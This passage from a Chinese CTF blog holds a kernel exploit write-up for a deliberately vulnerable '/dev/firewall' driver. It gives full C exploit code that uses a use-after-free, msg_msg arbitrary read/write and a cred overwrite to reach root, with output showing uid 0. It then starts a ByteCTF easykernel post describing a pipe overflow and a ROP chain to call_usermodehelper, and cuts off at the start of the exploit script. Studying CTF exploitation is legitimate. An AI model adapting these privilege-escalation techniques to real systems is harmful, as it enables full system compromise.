class="function"><span class="keyword">void</span> <span class="title">get_IPv4</span><span class="params">(<span class="keyword">uint32_t</span> ip,<span class="keyword">char</span> *ipv4)</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(ipv4,<span class="number">0</span>,<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d.%d.%d.%d\n&quot;</span>,(ip&amp;<span class="number">0xff</span>),(ip&amp;<span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span>,(ip&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span>,(ip&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(ipv4,<span class="string">&quot;%d.%d.%d.%d&quot;</span>,(ip&amp;<span class="number">0xff</span>),(ip&amp;<span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span>,(ip&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">16</span>,(ip&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">User_rule_t* <span class="title">init_user_rule</span><span class="params">(<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type,<span class="keyword">u_int32_t</span> ip,<span class="keyword">u_int32_t</span> netmask)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    User_rule_t *user_rule=(User_rule_t *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(User_rule_t));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;idx=idx;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    get_IPv4(ip,&amp;(user_rule-&gt;ip));</span><br><span class="line"></span><br><span class="line">    get_IPv4(netmask,&amp;(user_rule-&gt;netmask));</span><br><span class="line"></span><br><span class="line">    user_rule-&gt;type=type;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;idx:%d\n&quot;</span>,user_rule-&gt;idx);</span><br><span class="line">    <span class="keyword">return</span> user_rule;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;idx:%d\n&quot;</span>,<span class="keyword">user_rule_t</span>-&gt;idx);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,ADD_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;add fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DELETE_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;del fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dup_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint8_t</span> idx,<span class="keyword">uint8_t</span> type)</span></span>&#123;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>=init_user_rule(idx,type,<span class="number">0x11</span>,<span class="number">0x11</span>);</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,DUP_RULE,<span class="keyword">user_rule_t</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;edit fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_rule</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf,<span class="keyword">int</span> idx,<span class="keyword">int</span> type,<span class="keyword">int</span> flags)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> ip=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> netmask=*(<span class="keyword">uint32_t</span> *)(buf+<span class="number">0x24</span>);</span><br><span class="line">    User_rule_t *user_rule=init_user_rule(idx,type,ip,netmask);</span><br><span class="line">    <span class="built_in">memcpy</span>(user_rule,buf,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span>(!flags)&#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;ip),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;(user_rule-&gt;netmask),<span class="string">&quot;qqqqqqqqqq&quot;</span>,<span class="built_in">strlen</span>(<span class="string">&quot;qqqqqqqqqq&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret=ioctl(fd,EDIT_RULE,user_rule);</span><br><span class="line">    <span class="comment">// if(ret&lt;0)&#123;</span></span><br><span class="line">    <span class="comment">//     err_exit(&quot;edit fail&quot;);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msgflg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msgflg)) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">long</span> msgtype,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgrcv(msqid,msgp,msgsz,msgtype,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgrcv fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msqid,<span class="keyword">void</span> *msgp,<span class="keyword">size_t</span> msgsz,<span class="keyword">int</span> msgflag)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=msgsnd(msqid,msgp,msgsz,msgflag);</span><br><span class="line">    <span class="keyword">if</span>(ret&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;msgsend fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> msg_id,size;</span><br><span class="line">    msg *msg_buff;</span><br><span class="line">    User_rule_t *<span class="keyword">user_rule_t</span>;</span><br><span class="line">    <span class="keyword">size_t</span> re_buf[<span class="number">0x2000</span>/<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">size_t</span> init_ipc_ns=<span class="number">0</span>,kernel_base=<span class="number">0</span>,init_task=<span class="number">0</span>,init_cred=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int32_t</span> pid;</span><br><span class="line">    <span class="keyword">uint64_t</span> prev, curr;</span><br><span class="line"></span><br><span class="line">    fd=open(<span class="string">&quot;/dev/firewall&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open dev/firewall fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    msg_buff=(msg *)<span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    page=<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    page_size=<span class="number">0x1000</span>;</span><br><span class="line">    add_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    dup_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line"></span><br><span class="line">    msg_id=make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    msg_buff-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;(msg_buff-&gt;mtext),<span class="number">1</span>,<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(re_buf));</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    send_msg(msg_id, msg_buff, <span class="number">0x1010</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x50</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> shmid;</span><br><span class="line">        <span class="keyword">if</span> ((shmid = shmget(IPC_PRIVATE, <span class="number">100</span>, <span class="number">0600</span>)) == <span class="number">-1</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;shmget&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span> *shmaddr = shmat(shmid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (shmaddr == (<span class="keyword">void</span>*)<span class="number">-1</span>) &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;shmat&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] get kernel_base_addr...\n&quot;</span>);</span><br><span class="line">    size=<span class="number">0x1500</span>;</span><br><span class="line">    msg_header fake_msg_header;</span><br><span class="line">    fake_msg_header.ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">    fake_msg_header.ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=size;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">0</span>);</span><br><span class="line">    get_msg(msg_id, re_buf, size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((re_buf[i]&amp;<span class="number">0xfff</span>)==<span class="number">0x7a0</span>)&#123;</span><br><span class="line">            init_ipc_ns=re_buf[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = init_ipc_ns - <span class="number">0xc3d7a0</span>;</span><br><span class="line">    init_task = kernel_base + <span class="number">0xc124c0</span>;</span><br><span class="line">    init_cred = kernel_base + <span class="number">0xc33060</span>;</span><br><span class="line">    init_cred_addr=init_cred;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] init_ipc_ns: %p\n&quot;</span>, init_ipc_ns);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel_base: %p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] init_task: %p\n&quot;</span>, init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] init_cred: %p\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(re_buf));</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">void</span> *)&amp;fake_msg_header,<span class="number">0</span>,<span class="keyword">sizeof</span>(msg_header));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] search this process task_struct\n&quot;</span>);</span><br><span class="line">    fake_msg_header.m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header.m_ts=size;</span><br><span class="line">    fake_msg_header.next=(<span class="keyword">void</span> *)init_task+<span class="number">0x290</span>;</span><br><span class="line">    edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">    get_msg(msg_id, re_buf, size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)&amp;prev, (<span class="keyword">void</span> *)(((<span class="keyword">char</span> *)re_buf) + <span class="number">0xfe0</span>), <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)&amp;pid, (<span class="keyword">void</span> *)(((<span class="keyword">char</span> *)re_buf) + <span class="number">0x10d8</span>), <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, pid, getpid());</span><br><span class="line">    <span class="keyword">while</span>(pid!=getpid())&#123;</span><br><span class="line">        curr=prev<span class="number">-0x298</span>;</span><br><span class="line">        fake_msg_header.next=prev<span class="number">-0x8</span>;</span><br><span class="line">        edit_rule(fd,&amp;fake_msg_header,<span class="number">0</span>,OUTBOUND,<span class="number">1</span>);</span><br><span class="line">        get_msg(msg_id, re_buf, size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)&amp;prev, (<span class="keyword">void</span> *)(((<span class="keyword">char</span> *)re_buf) + <span class="number">0xfe0</span>), <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)&amp;pid, (<span class="keyword">void</span> *)(((<span class="keyword">char</span> *)re_buf) + <span class="number">0x10d8</span>), <span class="number">4</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, pid, getpid());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] get this process task_struct:%p\n&quot;</span>,curr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] now write for cred\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    add_rule(fd,<span class="number">1</span>,INBOUND);</span><br><span class="line">    dup_rule(fd,<span class="number">1</span>,INBOUND);</span><br><span class="line">    del_rule(fd,<span class="number">1</span>,INBOUND);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf=mmap(<span class="number">0x200000</span>,<span class="number">0x2000</span>,PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!buf)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;mmap fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    msg_buff=<span class="number">0x200000</span>+<span class="number">0x1000</span><span class="number">-0x8</span>;</span><br><span class="line">    msg_buff-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">    target_addr=curr + <span class="number">0x538</span> - <span class="number">0x8</span>;</span><br><span class="line">    size=<span class="number">0x1010</span>;</span><br><span class="line">    registerUserFaultFd(<span class="number">0x200000</span>+<span class="number">0x1000</span>,<span class="number">0x1000</span>,fault_handler_thread);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    send_msg(msg_id, msg_buff, size - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">    pthread_join(monitor_thread,<span class="literal">NULL</span>);</span><br><span class="line">    usr_shell();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>效果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ctf@CoRCTF:/exp$ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">ctf@CoRCTF:/exp$ /myexp</span><br><span class="line">idx:0</span><br><span class="line">[*] get kernel_base_addr...</span><br><span class="line">[+] init_ipc_ns: 0xffffffffa603d7a0</span><br><span class="line">[+] kernel_base: 0xffffffffa5400000</span><br><span class="line">[+] init_task: 0xffffffffa60124c0</span><br><span class="line">[+] init_cred: 0xffffffffa6033060</span><br><span class="line">[*] search this process task_struct</span><br><span class="line">0 86</span><br><span class="line">86 86</span><br><span class="line">[*] get this process task_struct:0xffff8d5c46128040</span><br><span class="line">[*] now write for cred</span><br><span class="line">idx:1</span><br><span class="line">getshelling</span><br><span class="line">[*]----getshell ok</span><br><span class="line">root@CoRCTF:/exp# id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学习到了在拥有了<code>4kb</code>的uaf情况下如何使用<code>msg</code>进行任意地址读和任意地址写的手段，还对<code>task_struct</code>进行了直观的了解，当然<code>msg</code>不仅能用于<code>4kb</code>情况下的<code>uaf</code>,它的功能非常强大。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/30/bytectf-easykernel-%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/30/bytectf-easykernel-%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">bytectf easykernel 复现</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-09-30 19:47:01 / 修改时间：19:48:16" itemprop="dateCreated datePublished" datetime="2022-09-30T19:47:01+08:00">2022-09-30</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="bytectf-easykernel-复现"><a href="#bytectf-easykernel-复现" class="headerlink" title="bytectf easykernel 复现"></a>bytectf easykernel 复现</h1><p>学长出的题，在比赛中由于没有接触过内核socket和arm指令集，然后再加上ida反汇编出来的代码非常抽象，看不清楚逻辑，所以直到比赛结束都没有找见洞在哪里，菜的离谱🤦‍♀️。只能在赛后复现复现这样子了。</p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>赛后就向学长要到了源码，看源码的时候发现了一个这个漏洞，可以溢出写，但是管道每次申请到的堆块的偏移不是固定的，所以不好利用，当时没注意到pop的时候不会清除标志位，经过学长提示才注意到，那从这个角度就好利用多了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (len &lt; <span class="number">0x2000</span> &amp;&amp; cnt &amp;&amp; cnt &lt; <span class="number">0x10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            recv(buf, len, csock);</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">block_struct</span> *<span class="title">blk</span> =</span> &amp;bpipe.blks[(bpipe.pos - <span class="number">1</span>) &amp; <span class="number">0x0f</span>];</span><br><span class="line">            <span class="keyword">int</span> left = <span class="number">0x1000</span> - blk-&gt;tail;</span><br><span class="line">            <span class="keyword">if</span> (blk-&gt;can_merge &amp;&amp; left &gt;= len - <span class="number">0x1000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                blk-&gt;tail = <span class="number">0x2000</span> - len;</span><br><span class="line">                <span class="built_in">memcpy</span>(blk-&gt;blk + blk-&gt;tail, buf, left);</span><br><span class="line">                push_bpipe_data(buf + (len - <span class="number">0x1000</span>), <span class="number">0</span>, <span class="number">0x1000</span>, <span class="number">0</span>, PUREDATA_BLK);</span><br><span class="line">                reply(<span class="string">&quot;[+] create pure data success!\n&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;[+] create pure data success!\n&quot;</span>), csock);</span><br><span class="line">                bfree(buf);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>就是利用server的<code>0x20</code>选项来塞满管道，这里面就有<code>can_merge=1</code>的管道了，然后在全部<code>pop</code>出来，再push<code>0x10</code>权限，就可以让<code>0x10</code>的的管道的<code>can_merge=1</code>,然后就可以越界读和越界写了。最后写<code>*callback_func</code>指针来完成rop。</p>
<p>可是这是内核socket不像一般的内核题可以传一个程序上去，这该如何rop呢，学长的exp给了一个思路，内核中提供了一个<code>call_usermodehelper</code>函数，允许在内核态执行一个用户态的程序，而且参数接口和用户态的exec()系列函数是一样的，第一个参数是程序名，第二个参数是指针数组，存储着执行这个程序的命令行参数。</p>
<p>所以只要rop能够1控制<code>r0</code>和<code>r1</code>然后让<code>pc=</code>call_usermodehelper就好了。</p>
<p>值得注意的是我们要rop就得控制sp,让sp指向我们精心布置的堆块上，这其实直接破坏了程序的上下文，当执行完<code>call_usermodehelper</code>再从栈中寻找上下文恢复到原来调用处就会失败，所以rop首先得保存正常的<code>sp</code>地址，然后再栈迁移，最后再恢复<code>sp</code>。</p>
<p>所以对gadget的寻找还是有点苛刻的，我觉得不是很好找，当按着学长的gadget复现完之后，尝试自己在找见一套gadget,最后成功简化了一些学长的gadget。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>gadget未简化版</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">key=<span class="string">&#x27;&#x27;</span></span><br><span class="line">key_flag=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span 